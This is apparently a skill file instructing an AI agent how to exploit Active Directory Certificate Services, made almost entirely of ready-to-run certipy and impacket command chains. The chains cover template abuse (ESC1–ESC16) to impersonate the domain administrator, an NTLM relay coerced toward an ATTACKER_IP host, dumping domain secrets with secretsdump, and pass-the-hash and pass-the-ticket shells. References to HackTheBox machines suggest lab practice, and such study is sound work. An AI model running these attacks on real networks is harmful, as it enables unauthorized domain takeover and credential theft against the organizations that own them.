---
name: adcs
description: Exploit Active Directory Certificate Services (ADCS). Use when certipy finds vulnerable templates, when ADCS is present on the domain, when discussing ESC1-ESC16, certificate template abuse, NTLM relay to web enrollment, enrollment agent attacks, or pass-the-cert.
user-invocable: false
allowed-tools: Read
---

# ADCS Exploitation

## Enumerate first — always
```bash
netexec ldap {IP} -u '{USER}' -p '{PASS}' -M adcs             # presence
certipy find -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {IP} -vulnerable -stdout
certipy find -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {IP} -stdout  # all templates
rusthound-ce -d {DOMAIN} -u '{USER}' -p '{PASS}' --dc-ip {IP} --zip  # BloodHound ADCS
```

## Decision tree
```
enrolleesuppliessubject=true + authenticationenabled=true + enrollable → ESC1
enrollment agent template available → ESC3
GenericAll/WriteOwner on template → ESC4
ManageCA or ManageCertificates right → ESC7
web enrollment enabled + no EPA → ESC8 (relay)
GenericWrite over user + no strong mapping → ESC10
GenericWrite over CA computer + no strong mapping → ESC16
schemaVersion=1 + can set application policy → ESC15
issuance policy OID linked to privileged group → ESC13
```

## ESC1 — Enroll as anyone
```bash
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -template '{TPL}' -upn administrator@{DOMAIN} -dc-ip {IP}
certipy auth -pfx administrator.pfx -dc-ip {IP}
```

## ESC3 — Enrollment agent
```bash
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -template '{AGENT_TPL}' -dc-ip {IP}
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -template '{TARGET_TPL}' -on-behalf-of '{DOMAIN}\administrator' -pfx agent.pfx -dc-ip {IP}
certipy auth -pfx administrator.pfx -dc-ip {IP}
```

## ESC4 — Modify template
```bash
certipy template -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {IP} -template '{TPL}' -save-old
certipy template -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {IP} -template '{TPL}' -configuration {TPL}.json
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -template '{TPL}' -upn administrator@{DOMAIN} -dc-ip {IP}
certipy auth -pfx administrator.pfx -dc-ip {IP}
certipy template -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {IP} -template '{TPL}' -configuration {TPL}.json.bak
```

## ESC7 — ManageCA
```bash
certipy ca -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -dc-ip {IP} -add-officer {USER}
certipy ca -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -dc-ip {IP} -enable-template SubCA
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -template SubCA -upn administrator@{DOMAIN} -dc-ip {IP}
certipy ca -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -dc-ip {IP} -issue-request {REQ_ID}
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -dc-ip {IP} -retrieve {REQ_ID}
certipy auth -pfx administrator.pfx -dc-ip {IP}
```

## ESC8 — NTLM relay to web enrollment
```bash
certipy relay -ca {CA_IP} -template DomainController
python3 printerbug.py {DOMAIN}/{USER}:'{PASS}'@{DC_FQDN} {ATTACKER_IP}
certipy auth -pfx {DC}.pfx -dc-ip {IP}
impacket-secretsdump -k -no-pass {DOMAIN}/{DC}$@{IP}
```

## ESC10 — GenericWrite over user
```bash
certipy account update -u '{USER}@{DOMAIN}' -p '{PASS}' -user {TARGET} -upn 'administrator' -dc-ip {IP}
certipy req -u '{TARGET}@{DOMAIN}' -p '{TARGET_PASS}' -ca '{CA}' -template User -dc-ip {IP}
certipy account update -u '{USER}@{DOMAIN}' -p '{PASS}' -user {TARGET} -upn '{TARGET}@{DOMAIN}' -dc-ip {IP}
certipy auth -pfx administrator.pfx -domain {DOMAIN} -dc-ip {IP}
```

## ESC15 — schemaVersion 1 (TombWatcher)
```bash
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -template '{TPL}' -application-policies 'Client Authentication' -upn 'administrator@{DOMAIN}' -dc-ip {IP}
certipy auth -pfx administrator.pfx -dc-ip {IP}
```

## ESC16 — GenericWrite over CA computer (Fluffy)
```bash
certipy account update -u '{USER}@{DOMAIN}' -p '{PASS}' -user '{CA_COMPUTER}$' -upn 'administrator' -dc-ip {IP}
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -template Machine -dc-ip {IP}
certipy account update -u '{USER}@{DOMAIN}' -p '{PASS}' -user '{CA_COMPUTER}$' -upn '{CA_COMPUTER}$@{DOMAIN}' -dc-ip {IP}
certipy auth -pfx administrator.pfx -domain {DOMAIN} -dc-ip {IP}
```

## ESC1 via computer account (Authority/Retro)
```bash
impacket-addcomputer {DOMAIN}/{USER}:'{PASS}' -computer-name 'FAKE$' -computer-pass 'FakePass123!'
certipy req -u 'FAKE$@{DOMAIN}' -p 'FakePass123!' -ca '{CA}' -template '{TPL}' -upn administrator@{DOMAIN} -dc-ip {IP}
certipy auth -pfx administrator.pfx -dc-ip {IP}
```

## After certipy auth
```bash
evil-winrm -i {IP} -u administrator -H {NT_HASH}          # PTH
export KRB5CCNAME=administrator.ccache                      # PTT
impacket-psexec {DOMAIN}/administrator@{DC_FQDN} -k -no-pass
certipy auth -pfx administrator.pfx -dc-ip {IP} -ldap-shell # when LDAP signing blocks
```

## Gotchas
- **authenticationenabled=false** → cannot be used for AD auth, skip entirely
- **gMSA Kerberoast** → 256-bit random, never cracks
- **IsUserSpecifiesSanEnabled=false** → ESC6 not active
- **Template shows vulnerable but not enrollable** → find path to enrollment group first
- **LDAP signing** → use `-ldap-shell` or Kerberos when NTLM blocked

## Key References
- https://www.ired.team — AD attack mechanics
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- https://www.thehacker.recipes
- https://github.com/ly4k/Certipy/wiki — ADCS ESC1-16
- https://0xdf.gitlab.io — HTB AD writeups